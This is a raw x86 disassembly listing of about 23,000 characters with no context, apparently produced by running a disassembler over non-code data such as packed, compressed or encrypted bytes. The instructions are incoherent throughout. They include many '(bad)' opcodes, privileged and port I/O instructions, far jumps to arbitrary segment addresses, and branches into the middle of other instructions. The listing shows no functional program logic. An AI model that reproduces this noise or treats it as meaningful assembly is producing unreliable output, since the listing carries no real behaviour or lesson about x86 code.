  41355a:	dec    ebx
  41355b:	test   eax,0x7e1eefa1
  413560:	out    dx,al
  413561:	sub    eax,0x75494eb2
  413566:	sbb    eax,esp
  413568:	cmp    eax,DWORD PTR [ecx-0x1bcc94c4]
  41356e:	add    al,0x6
  413570:	das    
  413571:	jns    0x4135be
  413573:	pop    esi
  413574:	or     ecx,DWORD PTR cs:[edi+0x4d]
  413578:	mov    dl,0x9d
  41357a:	push   eax
  41357b:	popa   
  41357c:	xchg   edx,eax
  41357d:	jmp    0x6783df7e
  413582:	into   
  413583:	mov    edx,0xcdac7027
  413588:	xor    DWORD PTR [esi],eax
  41358a:	push   0xa44c2280
  41358f:	das    
  413590:	pop    esi
  413591:	int3   
  413592:	and    dh,BYTE PTR [ebx]
  413594:	call   0x81616e31
  413599:	adc    DWORD PTR [esi],0x3dea98e8
  41359f:	inc    ecx
  4135a0:	dec    esp
  4135a1:	mov    bh,0xab
  4135a3:	cld    
  4135a4:	push   esi
  4135a5:	sub    ch,0x91
  4135a8:	mov    ch,0x25
  4135aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135ab:	test   eax,0xcdae376
  4135b0:	loopne 0x41362f
  4135b2:	dec    ebx
  4135b3:	loop   0x41362b
  4135b5:	clc    
  4135b6:	add    al,0xc5
  4135b8:	jns    0x4135c3
  4135ba:	cli    
  4135bb:	cmp    eax,0x69a0722f
  4135c0:	das    
  4135c1:	and    edi,DWORD PTR [eax+0x7c]
  4135c4:	imul   ebp,eax,0x175abe08
  4135ca:	fistp  WORD PTR [esi]
  4135cc:	pop    ebp
  4135cd:	into   
  4135ce:	mov    ch,0x46
  4135d0:	sbb    BYTE PTR [ebx-0x79],ch
  4135d3:	lds    esi,FWORD PTR [edx+0x1]
  4135d6:	push   cs
  4135d7:	inc    edi
  4135d8:	nop
  4135d9:	test   al,0xe9
  4135db:	sti    
  4135dc:	mov    edi,esp
  4135de:	push   es
  4135df:	or     BYTE PTR [esi],dh
  4135e1:	popf   
  4135e2:	jno    0x413564
  4135e4:	dec    eax
  4135e5:	or     eax,0x503d159d
  4135ea:	add    al,0x2
  4135ec:	imul   eax,DWORD PTR [edi-0x3f],0xd611f93c
  4135f3:	scas   eax,DWORD PTR es:[edi]
  4135f4:	jmp    0xe60e:0x476b57dd
  4135fb:	fbld   TBYTE PTR [ebx-0x4bab550c]
  413601:	out    0x10,eax
  413603:	jnp    0x413623
  413605:	stos   DWORD PTR es:[edi],eax
  413606:	fcmove st,st(4)
  413608:	cmp    eax,0x48879a41
  41360d:	dec    BYTE PTR [eax]
  41360f:	sbb    bh,BYTE PTR [ebp+ebp*8+0x46cfc8af]
  413616:	adc    DWORD PTR [ebx-0x65286cd7],esp
  41361c:	pop    ecx
  41361d:	popa   
  41361e:	jecxz  0x413679
  413620:	dec    esi
  413621:	(bad)  
  413622:	and    BYTE PTR [edi-0x3d],dl
  413625:	jmp    0x43a5a20b
  41362a:	sbb    dl,BYTE PTR [esi+0x41]
  41362d:	dec    esi
  41362e:	imul   DWORD PTR [edi+eiz*8-0x5809fcd8]
  413635:	mov    WORD PTR [eax],ds
  413637:	and    DWORD PTR [ecx-0x1b],edi
  41363a:	xchg   ebx,eax
  41363b:	mov    ds:0x2e62c549,al
  413640:	stos   BYTE PTR es:[edi],al
  413641:	lods   eax,DWORD PTR ds:[esi]
  413642:	fxch   st(6)
  413644:	jmp    0x4136bb
  413646:	in     eax,0x69
  413648:	xchg   edi,eax
  413649:	int    0x4f
  41364b:	sbb    esp,DWORD PTR [ebx+0x53]
  41364e:	mov    cl,0x35
  413650:	mov    ds:0xeb66da8d,eax
  413655:	xor    al,0xe5
  413657:	jae    0x413626
  413659:	xchg   ebp,eax
  41365a:	test   DWORD PTR [ebx-0xd07892d],ebp
  413660:	sahf   
  413661:	lods   eax,DWORD PTR ds:[esi]
  413662:	pop    ebx
  413663:	aam    0xa4
  413665:	cdq    
  413666:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413667:	test   al,0x82
  413669:	js     0x413669
  41366b:	pushf  
  41366c:	inc    ebp
  41366d:	mov    DWORD PTR [ebx+0x68],esi
  413670:	mov    ah,0x28
  413672:	out    dx,al
  413673:	les    esp,FWORD PTR [ecx-0x43598bb8]
  413679:	call   0xf914a9a9
  41367e:	repnz sbb eax,0x39d5b19a
  413684:	jb     0x41368a
  413686:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413687:	xor    eax,0x4fc5b98d
  41368c:	jle    0x413672
  41368e:	dec    eax
  41368f:	jle    0x4136d9
  413691:	xor    DWORD PTR [ecx+0x779192c3],ebp
  413697:	xlat   BYTE PTR ds:[ebx]
  413698:	in     eax,0xc6
  41369a:	mov    gs,WORD PTR [esi+ecx*4+0x10]
  41369e:	push   edi
  41369f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4136a0:	xchg   ecx,eax
  4136a1:	imul   eax,DWORD PTR [edx+0x32586f6e],0x2f439ce8
  4136ab:	mov    edx,0x68ebf7a2
  4136b0:	sub    al,0xe
  4136b2:	xor    esi,DWORD PTR ds:0x4767c014
  4136b8:	(bad)  
  4136b9:	fidiv  WORD PTR [ebx]
  4136bb:	repz imul ebx,DWORD PTR [edx-0x7d23fee6],0x8092f93d
  4136c6:	xor    bl,BYTE PTR [ebx-0x35]
  4136c9:	or     ecx,DWORD PTR [ecx]
  4136cb:	jbe    0x4136cf
  4136cd:	pop    ds
  4136ce:	sbb    ah,dh
  4136d0:	icebp  
  4136d1:	pop    esp
  4136d2:	sbb    al,0xca
  4136d4:	and    BYTE PTR [ecx-0x471729],ah
  4136da:	mov    bh,0x49
  4136dc:	imul   esp,DWORD PTR [ecx-0x9],0xffffffe5
  4136e0:	mov    edx,0xd9c79af1
  4136e5:	std    
  4136e6:	xor    bh,0x60
  4136e9:	aaa    
  4136ea:	loopne 0x413757
  4136ec:	push   0xffffffdc
  4136ee:	fs ffreep st(6)
  4136f1:	faddp  st(4),st
  4136f3:	(bad)  
  4136f4:	aam    0x72
  4136f6:	mov    DWORD PTR [esi-0x73020145],eax
  4136fc:	pop    es
  4136fd:	les    edi,FWORD PTR [esi+0x4e]
  413700:	jmp    0xea86a33
  413705:	out    dx,eax
  413706:	aas    
  413707:	sub    eax,0x2527838e
  41370c:	mov    ebp,0x226d59ab
  413711:	outs   dx,DWORD PTR ds:[esi]
  413712:	cwde   
  413713:	xchg   esp,eax
  413714:	xor    cl,BYTE PTR ds:0xc91a9b60
  41371a:	xchg   ebx,eax
  41371b:	rcl    DWORD PTR [ebp+0x1be5a2e9],cl
  413721:	lds    ebp,FWORD PTR [edi-0x53d1f7c4]
  413727:	xor    ch,dh
  413729:	sub    ax,0x7688
  41372d:	rol    DWORD PTR [esi+0x59],1
  413730:	inc    edx
  413731:	xor    ebx,edi
  413733:	test   BYTE PTR [edx+0x1],0x60
  413737:	jmp    0x413764
  413739:	imul   ecx,DWORD PTR [ebp+0x73],0x619577a9
  413740:	aaa    
  413741:	and    al,0x58
  413743:	imul   DWORD PTR [esi+0x6ce73bbb]
  413749:	jb     0x4137a9
  41374b:	xchg   esi,eax
  41374c:	mov    dh,0x39
  41374e:	mov    BYTE PTR [edi],al
  413750:	stos   BYTE PTR es:[edi],al
  413751:	mov    WORD PTR [ecx+ecx*4],ds
  413754:	(bad)  
  413755:	sub    BYTE PTR ds:0x79dbc5a9,bl
  41375b:	lods   al,BYTE PTR ds:[esi]
  41375c:	fwait
  41375d:	xchg   ecx,eax
  41375e:	(bad)  
  41375f:	arpl   WORD PTR [esi-0x57],dx
  413762:	push   esi
  413763:	xchg   DWORD PTR [ecx-0x40],ebp
  413766:	call   0x86c7:0xa8453ec3
  41376d:	xchg   edx,eax
  41376e:	mov    ecx,0xedbba60c
  413773:	cs and eax,0x8276ef97
  413779:	or     eax,0x1e625223
  41377e:	aaa    
  41377f:	inc    ebp
  413780:	test   DWORD PTR [eax+0x19],ebp
  413783:	cmp    al,BYTE PTR [edi-0x1d30fd37]
  413789:	push   es
  41378a:	imul   esp,DWORD PTR ds:0x4d6fb075,0x4072bdbc
  413794:	je     0x41373b
  413796:	push   ss
  413797:	(bad)  
  413798:	xchg   edi,eax
  413799:	icebp  
  41379a:	ja     0x413812
  41379c:	sub    ebx,DWORD PTR [edi+0x1c]
  41379f:	sbb    BYTE PTR [edx-0x45],bh
  4137a2:	jb     0x41374b
  4137a4:	das    
  4137a5:	cmp    al,0x45
  4137a7:	jb     0x41377d
  4137a9:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137ab:	shr    DWORD PTR [eax+0x4777bc8b],0x36
  4137b2:	aad    0xcf
  4137b4:	je     0x4137e2
  4137b6:	mov    BYTE PTR [edx-0x76222573],bl
  4137bc:	mov    cx,0xd81a
  4137c0:	and    ch,0x91
  4137c3:	shl    DWORD PTR gs:[eax+0x67],cl
  4137c7:	dec    ecx
  4137c8:	cmp    DWORD PTR [ecx],ebp
  4137ca:	pop    esp
  4137cb:	push   es
  4137cc:	xchg   esp,eax
  4137cd:	scas   al,BYTE PTR es:[edi]
  4137ce:	(bad)  
  4137cf:	(bad)  
  4137d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137d1:	xchg   esi,eax
  4137d2:	jmp    FWORD PTR ds:0x5104ac50
  4137d8:	mov    DWORD PTR [edi+ebp*8-0x7f],esp
  4137dc:	xor    DWORD PTR [esi+0x4f3c8c69],eax
  4137e2:	push   ecx
  4137e3:	push   esi
  4137e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4137e5:	retf   0xbd38
  4137e8:	stos   DWORD PTR es:[edi],eax
  4137e9:	push   edx
  4137ea:	sub    eax,0x27769cd5
  4137ef:	cwde   
  4137f0:	js     0x413846
  4137f2:	sbb    dh,dl
  4137f4:	pop    eax
  4137f5:	xor    al,0x6
  4137f7:	mov    al,0xd5
  4137f9:	jmp    DWORD PTR [esi+0x4b]
  4137fc:	lea    ebx,ss:[esi]
  4137ff:	(bad)  [ebp+0x15]
  413802:	sti    
  413803:	daa    
  413804:	dec    esi
  413805:	ror    BYTE PTR [ebx+0x2993784d],1
  41380b:	(bad)  [edx+0x2a]
  41380e:	and    edi,esi
  413810:	call   0xa310:0xffcc5c29
  413817:	rcl    DWORD PTR [ebx-0x11],1
  41381a:	stos   DWORD PTR es:[edi],eax
  41381b:	sub    bh,BYTE PTR [ebp+0x4189195f]
  413821:	inc    esi
  413822:	call   0x779d9093
  413827:	out    dx,ax
  413829:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41382a:	clc    
  41382b:	xchg   esi,eax
  41382c:	mov    ebp,gs
  41382e:	lea    eax,[ecx]
  413830:	and    eax,0x718dcbe0
  413835:	in     eax,dx
  413836:	xchg   ebx,eax
  413837:	hlt    
  413838:	arpl   WORD PTR fs:[edi+0x32],si
  41383c:	dec    edi
  41383d:	mov    eax,ds:0x52cf5235
  413842:	or     DWORD PTR [ecx],edi
  413844:	sti    
  413845:	clc    
  413846:	aad    0x80
  413848:	mov    edx,0xde4adc26
  41384d:	mov    cs,WORD PTR [esi]
  41384f:	imul   esp,ecx,0xffffffa9
  413852:	test   DWORD PTR [ecx],ebp
  413854:	sbb    ecx,ebx
  413856:	inc    eax
  413857:	(bad)  
  413858:	mov    eax,ds:0x8fc0c9f7
  41385d:	adc    eax,ecx
  41385f:	or     edx,DWORD PTR [edx+0x74]
  413862:	scas   al,BYTE PTR es:[edi]
  413863:	popa   
  413864:	jne    0x413828
  413866:	pop    edi
  413867:	int    0x85
  413869:	lea    esp,[edx]
  41386b:	mov    ah,0x1d
  41386d:	int    0xf0
  41386f:	int    0x2e
  413871:	mov    ?,ebx
  413873:	jne    0x41383d
  413875:	les    ebx,FWORD PTR [edx]
  413877:	cld    
  413878:	not    ah
  41387a:	rol    esi,cl
  41387c:	bound  ebp,QWORD PTR [edi-0x31]
  41387f:	stos   DWORD PTR es:[edi],eax
  413880:	inc    ebx
  413881:	mov    edi,0x51fce89a
  413886:	leave  
  413887:	ja     0x4138ba
  413889:	(bad)
  41388c:	scas   eax,DWORD PTR es:[edi]
  41388d:	rcl    DWORD PTR [edi+0x2de8bc38],0x74
  413894:	pop    ds
  413895:	cld    
  413896:	mov    eax,ds:0xe8076f2b
  41389b:	daa    
  41389c:	xor    BYTE PTR [eax-0x62],dl
  41389f:	push   edx
  4138a0:	dec    eax
  4138a1:	mov    eax,ds:0x3ba855f3
  4138a6:	test   eax,0x25707f60
  4138ab:	or     al,0xd4
  4138ad:	das    
  4138ae:	dec    eax
  4138af:	in     al,0x90
  4138b1:	mov    edx,0x7a75c4b5
  4138b6:	mov    bl,0x7
  4138b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138b9:	jns    0x413884
  4138bb:	retf   0xa1d6
  4138be:	retf   
  4138bf:	sbb    ebp,DWORD PTR [ecx+0x1d8d0d2c]
  4138c5:	inc    esp
  4138c6:	aaa    
  4138c7:	in     eax,0x1f
  4138c9:	inc    esp
  4138ca:	es (bad) 
  4138cc:	fst    QWORD PTR [eax-0x23]
  4138cf:	cmp    ebx,edi
  4138d1:	mov    eax,0x923d4a09
  4138d6:	mov    DWORD PTR [ebp-0x385ea0b],eax
  4138dc:	ror    DWORD PTR [edi-0x73],1
  4138df:	call   0x6a0c26c
  4138e4:	or     al,0xc2
  4138e6:	adc    al,0x95
  4138e8:	fldcw  WORD PTR [ebx+0x5cb60c0d]
  4138ee:	mov    ebp,0xba132b55
  4138f3:	ss loope 0x41393a
  4138f6:	out    dx,al
  4138f7:	mov    dl,0x31
  4138f9:	push   DWORD PTR [eax]
  4138fb:	xor    ebx,ecx
  4138fd:	(bad)  
  4138ff:	jmp    0x590d:0x15d84b17
  413906:	(bad)  
  413907:	outs   dx,DWORD PTR ds:[esi]
  413908:	ja     0x4138f8
  41390a:	xchg   esp,eax
  41390b:	das    
  41390c:	adc    al,0xed
  41390e:	dec    esi
  41390f:	scas   al,BYTE PTR es:[edi]
  413910:	fcom   DWORD PTR [ecx+eiz*8-0x49]
  413914:	dec    ebp
  413915:	jne    0x413952
  413917:	pop    ebp
  413918:	outs   dx,BYTE PTR ds:[esi]
  413919:	nop
  41391a:	lock rcl BYTE PTR [ebx+eax*1-0x700e2b36],1
  413922:	push   edx
  413923:	mov    dl,0x52
  413925:	cmp    DWORD PTR [eax-0x1a],edi
  413928:	aaa    
  413929:	(bad)  
  41392a:	push   ss
  41392b:	or     DWORD PTR [ecx-0x79d283ce],edi
  413931:	or     DWORD PTR [ebp+0x68b27577],ecx
  413937:	test   BYTE PTR [edx+0x6617e548],al
  41393d:	fbld   TBYTE PTR [esi]
  41393f:	in     eax,dx
  413940:	gs mov al,al
  413943:	in     eax,0x42
  413945:	icebp  
  413946:	add    al,bl
  413948:	xchg   ebp,eax
  413949:	xchg   esi,eax
  41394a:	das    
  41394b:	cwde   
  41394c:	pop    es
  41394d:	cmp    DWORD PTR [ebp-0x592f885d],ecx
  413953:	dec    ebx
  413954:	add    al,0x35
  413956:	xor    DWORD PTR [esi],edi
  413958:	sub    dl,0xc5
  41395b:	xor    al,0xf1
  41395d:	bound  esi,QWORD PTR [ebx-0x6f]
  413960:	mov    edx,0x2c1bb3f8
  413965:	ret    
  413966:	adc    cl,bl
  413968:	jg     0x4139b5
  41396a:	pop    esi
  41396b:	lock lock jmp 0x88b3eaf
  413972:	xchg   DWORD PTR [edx+0x40],ecx
  413975:	in     eax,0xa9
  413977:	or     DWORD PTR [edx+0x36145408],edx
  41397d:	icebp  
  41397e:	ins    BYTE PTR es:[edi],dx
  41397f:	int3   
  413980:	cmp    BYTE PTR [ebp-0x4c],al
  413983:	adc    ah,BYTE PTR ds:0xcb8e7574
  413989:	out    dx,eax
  41398a:	(bad)  
  41398b:	ror    BYTE PTR [esi+ebx*4-0x4d],1
  41398f:	and    BYTE PTR [edx],ch
  413991:	jg     0x413945
  413993:	int3   
  413994:	pop    edx
  413995:	cli    
  413996:	mov    ch,0xcf
  413998:	or     ecx,DWORD PTR [esi-0x2649f9e5]
  41399e:	inc    ebp
  41399f:	pop    ecx
  4139a0:	imul   ebx,DWORD PTR [edi],0xffffffd4
  4139a3:	iret   
  4139a4:	rol    BYTE PTR [esi-0x513d7750],cl
  4139aa:	sbb    eax,DWORD PTR [eax+0x6b]
  4139ad:	das    
  4139ae:	sti    
  4139af:	out    0x69,al
  4139b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139b2:	sbb    BYTE PTR [edx+0xc5c8db1],0x38
  4139b9:	ror    DWORD PTR [edx+0x7560b592],0x92
  4139c0:	mov    eax,gs
  4139c2:	fist   DWORD PTR [edx]
  4139c4:	add    esp,DWORD PTR ds:0xef29eea0
  4139ca:	js     0x413a34
  4139cc:	dec    edx
  4139cd:	out    dx,al
  4139ce:	inc    edi
  4139cf:	xor    eax,0xe844f8cb
  4139d4:	imul   esi,DWORD PTR [eax+0x5fdc878d],0x5b
  4139db:	mov    dl,0x42
  4139dd:	jo     0x413a56
  4139df:	pop    ebx
  4139e0:	ror    ebp,0x3a
  4139e3:	and    dh,cl
  4139e5:	loop   0x41398e
  4139e7:	sub    eax,0x41214239
  4139ec:	ret    0x80e4
  4139ef:	dec    esp
  4139f0:	mov    BYTE PTR [ecx+0x2fe44baa],ah
  4139f6:	dec    esp
  4139f7:	mov    ds:0x5f98defa,eax
  4139fc:	stos   BYTE PTR es:[di],al
  4139fe:	jno    0x4139ab
  413a00:	call   0x64488b19
  413a05:	push   cs
  413a06:	sahf   
  413a07:	sti    
  413a08:	add    eax,DWORD PTR [esp]
  413a0b:	mov    edx,0x3faf5b26
  413a10:	(bad)  
  413a11:	inc    eax
  413a12:	aas    
  413a13:	loopne 0x413a01
  413a15:	push   esp
  413a17:	rol    BYTE PTR [esi-0x2be0b42a],0x39
  413a1e:	call   0xc1645674
  413a23:	pop    ds
  413a24:	push   ebx
  413a25:	imul   edi,DWORD PTR [ebx-0x70],0x51eb6bab
  413a2c:	jecxz  0x413a18
  413a2e:	inc    esp
  413a2f:	sub    dh,al
  413a31:	in     eax,0xa8
  413a33:	rol    BYTE PTR [ebp+0x4c891e1c],cl
  413a39:	mov    cl,0x92
  413a3b:	into   
  413a3c:	call   FWORD PTR [ecx+eiz*1+0x3ed092d4]
  413a43:	pop    ebx
  413a44:	push   cs
  413a45:	pushf  
  413a46:	mov    ah,0xd
  413a48:	xor    BYTE PTR [edi],ch
  413a4a:	(bad)  
  413a4b:	and    al,0x47
  413a4d:	add    BYTE PTR [ecx-0x17],ah
  413a50:	mov    eax,ds:0x49cfdfbe
  413a55:	dec    ebp
  413a56:	loopne 0x413a95
  413a58:	dec    eax
  413a59:	(bad)
  413a5d:	jge    0x413a33
  413a5f:	cmp    ah,al
  413a61:	mov    ebp,0xecd1aa1e
  413a66:	fstp   DWORD PTR [ecx]
  413a68:	pop    edi
  413a69:	imul   DWORD PTR [eax+0x49]
  413a6c:	push   ss
  413a6d:	hlt    
  413a6e:	add    DWORD PTR [ecx+esi*4],esp
  413a71:	rol    BYTE PTR [edx],cl
  413a73:	mov    eax,ds:0xb5e99bc2
  413a78:	xchg   ecx,eax
  413a79:	shl    DWORD PTR [edi-0x4c28c2c2],0xc8
  413a80:	dec    eax
  413a81:	dec    ebx
  413a82:	in     al,0xcd
  413a84:	dec    eax
  413a85:	inc    edi
  413a86:	jmp    0xbb37:0x2c32b5fb
  413a8d:	aam    0x1c
  413a8f:	and    BYTE PTR [edi],0x67
  413a92:	scas   al,BYTE PTR es:[edi]
  413a93:	lods   al,BYTE PTR ss:[esi]
  413a95:	mov    eax,ds:0xa519228d
  413a9a:	push   ds
  413a9b:	mov    BYTE PTR [ebp-0x13],al
  413a9e:	sbb    DWORD PTR [eax],edi
  413aa0:	dec    edi
  413aa1:	inc    edx
  413aa2:	pop    eax
  413aa3:	mov    edx,0x2d70baec
  413aa8:	outs   dx,BYTE PTR ds:[esi]
  413aa9:	and    al,0x30
  413aab:	push   ss
  413aac:	xor    BYTE PTR [esi-0x52280e97],cl
  413ab2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ab3:	jmp    0xf263:0x169a29f9
  413aba:	pop    ebp
  413abb:	int    0xb9
  413abd:	push   DWORD PTR [ecx]
  413abf:	xlat   BYTE PTR ds:[ebx]
  413ac0:	jnp    0x413ab0
  413ac2:	push   ebx
  413ac3:	int3   
  413ac4:	pop    edx
  413ac5:	mov    eax,ds:0x9f3aca86
  413aca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413acb:	lds    ebx,FWORD PTR [edi-0xe]
  413ace:	enter  0x4f9c,0x8e
  413ad2:	push   esi
  413ad3:	or     ebp,DWORD PTR [edi]
  413ad5:	pop    edi
  413ad6:	xchg   ecx,eax
  413ad7:	cdq    
  413ad8:	rol    BYTE PTR [edi-0x31cd3f79],1
  413ade:	bound  ebp,QWORD PTR [edx-0x4c2198ba]
  413ae4:	stos   DWORD PTR es:[edi],eax
  413ae5:	push   esp
  413ae6:	je     0x413b55
  413ae8:	lds    ebx,FWORD PTR [eax+0x3a2aadb8]
  413aee:	sub    esp,eax
  413af0:	or     al,0x2b
  413af2:	les    ebx,FWORD PTR [edi]
  413af4:	mov    dh,0x26
  413af6:	jmp    0xfcd0:0xd0f35c15
  413afd:	fscale 
  413aff:	mov    cl,0x43
  413b01:	mov    al,BYTE PTR [ebp+0x52]
  413b04:	xchg   esp,eax
  413b05:	adc    eax,0x3af620f
  413b0a:	push   ebx
  413b0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b0c:	neg    DWORD PTR [ecx]
  413b0e:	mov    ds:0x9514d592,eax
  413b14:	je     0x413ad9
  413b16:	call   0x46fb6d56
  413b1b:	shl    DWORD PTR [esi],1
  413b1d:	int    0x28
  413b1f:	das    
  413b20:	and    eax,0xd1046cbe
  413b25:	cwde   
  413b26:	mov    cl,0x64
  413b28:	repz sbb ch,BYTE PTR [edi]
  413b2b:	lods   eax,DWORD PTR ds:[esi]
  413b2c:	test   al,0xb
  413b2e:	ins    BYTE PTR es:[edi],dx
  413b2f:	pop    ds
  413b30:	add    al,0xf6
  413b32:	jb     0x413b4c
  413b34:	adc    edx,DWORD PTR [edx]
  413b36:	or     DWORD PTR [esi+0x30],esi
  413b39:	or     BYTE PTR [ecx+0x50e1c01c],0x56
  413b40:	jo     0x413b96
  413b42:	or     eax,0x9a530c93
  413b47:	jg     0x413bbe
  413b49:	adc    al,0xbf
  413b4b:	fsubrp st(6),st
  413b4d:	jbe    0x413b6e
  413b4f:	icebp  
  413b50:	jle    0x413b3e
  413b52:	(bad)  
  413b54:	mov    edx,0x1783981
  413b59:	mov    bl,0x9
  413b5b:	in     al,0xc8
  413b5d:	repnz add edi,DWORD PTR [ecx-0x1e7c60d4]
  413b64:	in     al,dx
  413b65:	cmp    eax,0x46afc27b
  413b6a:	dec    ebp
  413b6b:	aad    0x62
  413b6d:	shr    ebp,0xea
  413b70:	inc    ebp
  413b71:	lods   eax,DWORD PTR ds:[esi]
  413b72:	pop    eax
  413b73:	push   edi
  413b74:	loop   0x413b4b
  413b76:	inc    ecx
  413b77:	and    BYTE PTR [eax],dh
  413b79:	in     eax,dx
  413b7a:	cmp    al,0xb4
  413b7c:	sar    ah,0x4b
  413b7f:	mov    edi,0x87320a91
  413b84:	inc    ebx
  413b85:	add    BYTE PTR [edx+0x64],ah
  413b88:	cs in  al,dx
  413b8a:	lea    esi,[eax]
  413b8c:	sub    eax,0x5b01e26f
  413b91:	in     al,dx
  413b92:	bnd jg 0x413bd4
  413b95:	addr16 aad 0x46
  413b98:	jg     0x413be7
  413b9a:	mov    ds:0x3cfbf7c7,al
  413b9f:	lock jno 0x413b52
  413ba2:	outs   dx,DWORD PTR ds:[esi]
  413ba3:	int3   
  413ba4:	and    DWORD PTR [esi-0xe],ecx
  413ba7:	js     0x413b7a
  413ba9:	inc    ecx
  413baa:	jno    0x413c19
  413bac:	lahf   
  413bad:	retf   
  413bae:	rcr    cl,0x36
  413bb1:	cmp    dl,bh
  413bb3:	cld    
  413bb4:	mov    ebx,0x3aa74b76
  413bb9:	rol    BYTE PTR [ebx-0xe],0x88
  413bbd:	inc    ecx
  413bbe:	call   0x5c1422de
  413bc3:	mov    ebp,0x7600ca
  413bc8:	xor    esi,DWORD PTR [ebx+ecx*1-0x75e8e663]
  413bcf:	fs (bad) 
  413bd1:	in     al,0x18
  413bd3:	pop    ebp
  413bd4:	jecxz  0x413be4
  413bd6:	jecxz  0x413bea
  413bd8:	call   0xc7b9:0x1e0128b4
  413bdf:	and    ecx,DWORD PTR [ecx-0x35]
  413be2:	and    eax,0x241de405
  413be7:	adc    edi,DWORD PTR [esi+0x11]
  413bea:	ret    0xdc7e
  413bed:	mov    cl,0x79
  413bef:	test   eax,0x3a7f8ad
  413bf4:	sahf   
  413bf5:	pop    esp
  413bf6:	dec    esi
  413bf7:	add    BYTE PTR [ebp+0x15],ch
  413bfa:	mov    dl,bl
  413bfc:	inc    esi
  413bfd:	fyl2x  
  413bff:	mov    esi,0x2f4ec7b3
  413c04:	sub    DWORD PTR ds:0xa3bc82d,0x4a20c208
  413c0e:	dec    edi
  413c0f:	and    BYTE PTR ds:0x7f1e532a,ch
  413c15:	retf   
  413c16:	dec    ebp
  413c17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c18:	pop    eax
  413c19:	(bad)  
  413c1a:	std    
  413c1b:	iret   
  413c1c:	cwde   
  413c1d:	push   ebx
  413c1e:	inc    eax
  413c1f:	jmp    0x550b:0xd534a152
  413c26:	ror    esi,1
  413c28:	scas   eax,DWORD PTR es:[edi]
  413c29:	or     edx,DWORD PTR [eax]
  413c2b:	ret    0xccd6
  413c2e:	les    esp,FWORD PTR [ecx+0x2bcefdcb]
  413c34:	retf   
  413c35:	nop
  413c36:	or     dh,BYTE PTR ds:0x9e28d063
  413c3c:	int3   
  413c3d:	and    DWORD PTR [esi+0x3e],edx
  413c40:	fcmove st,st(5)
  413c42:	lds    ecx,FWORD PTR [ecx+0x73]
  413c45:	xchg   edx,eax
  413c46:	mov    al,ds:0x4c745953
  413c4b:	and    eax,0x77a0d528
  413c50:	lds    esi,FWORD PTR [esp+esi*2-0x5a]
  413c54:	jnp    0x413c63
  413c56:	jmp    0x413c9b
  413c58:	jno    0x413c46
  413c5a:	jl     0x413c5e
  413c5c:	or     ebp,DWORD PTR [ebx+0x71]
  413c5f:	clc    
  413c60:	mov    esi,0x1315398b
  413c65:	cmc    
  413c66:	mov    ds:0xe662a732,eax
  413c6b:	repnz push ebp
  413c6d:	push   cs
  413c6e:	sub    eax,0x204a577c
  413c73:	fistp  DWORD PTR [eax+0xd5e238f]
  413c79:	xchg   ebp,eax
  413c7a:	jge    0x413cb7
  413c7c:	fiadd  WORD PTR [esi-0x2f]
  413c7f:	(bad)  
  413c80:	shl    DWORD PTR [edi],cl
  413c82:	fisttp WORD PTR [ebx]
  413c84:	inc    edx
  413c85:	xor    esi,ebx
  413c87:	lahf   
  413c88:	push   0xffffffc0
  413c8a:	or     DWORD PTR ds:0x1f8439f9,ecx
  413c90:	push   ebp
  413c91:	xor    BYTE PTR [ebx+0x62b10851],dh
  413c97:	xor    BYTE PTR [esi],al
  413c99:	sbb    eax,0xfc4bf6fd
  413c9e:	call   0x2a0cb44d
  413ca3:	je     0x413c9c
  413ca5:	test   DWORD PTR [eax+0x5edbe57b],esp
  413cab:	mov    eax,0xc428585d
  413cb0:	ja     0x413d24
  413cb2:	xchg   edx,eax
  413cb3:	out    0xc4,al
  413cb5:	push   ebp
  413cb6:	mov    al,0x9f
  413cb8:	and    BYTE PTR [eax],dl
  413cba:	test   DWORD PTR [edi+ecx*4],ebx
  413cbd:	out    dx,al
  413cbe:	aaa    
  413cbf:	xchg   ebx,eax
  413cc0:	push   ecx
  413cc1:	dec    ebx
  413cc2:	imul   esp,DWORD PTR [ecx+0x63],0xfffffff5
  413cc6:	scas   eax,DWORD PTR es:[edi]
  413cc7:	into   
  413cc8:	jp     0x413d3e
  413cca:	mov    ds:0x4e25d995,al
  413ccf:	pop    esi
  413cd0:	jb     0x413ca0
  413cd2:	fs sti 
  413cd4:	xor    dh,BYTE PTR [ebx+0x26]
  413cd7:	sbb    al,0xa1
  413cd9:	(bad)  
  413cda:	jg     0x413ccc
  413cdc:	jnp    0x413cfb
  413cde:	push   eax
  413cdf:	and    DWORD PTR [eax],ecx
  413ce1:	dec    esp
  413ce2:	push   0x41
  413ce4:	mov    ebx,0xd461b91c
  413ce9:	xor    ah,BYTE PTR [esi+0x262547bf]
  413cef:	sub    edi,DWORD PTR [edx+0x2d]
  413cf2:	cmp    BYTE PTR [edi+edi*4],cl
  413cf5:	xor    al,0x96
  413cf7:	int3   
  413cf8:	pop    esp
  413cf9:	push   edx
  413cfa:	dec    DWORD PTR [edi-0x6e]
  413cfd:	cmp    al,0x6e
  413cff:	mov    eax,ds:0x42b0a48d
  413d04:	inc    edi
  413d05:	and    DWORD PTR [esi+0x7ed7a403],eax
  413d0b:	inc    ebp
  413d0c:	jns    0x413d48
  413d0e:	js     0x413cc2
  413d10:	shr    DWORD PTR [eax],1
  413d12:	jp     0x413d6c
  413d14:	sbb    dh,BYTE PTR [eax]
  413d16:	xor    ch,BYTE PTR [eax-0x76]
  413d19:	stc    
  413d1a:	push   esp
  413d1b:	sub    al,0xa6
  413d1d:	lea    eax,[edi-0x1138e18a]
  413d23:	cs xchg edi,eax
  413d25:	leave  
  413d26:	stos   DWORD PTR es:[edi],eax
  413d27:	cwde   
  413d28:	cwde   
  413d29:	jbe    0x413d51
  413d2b:	push   edx
  413d2c:	push   esi
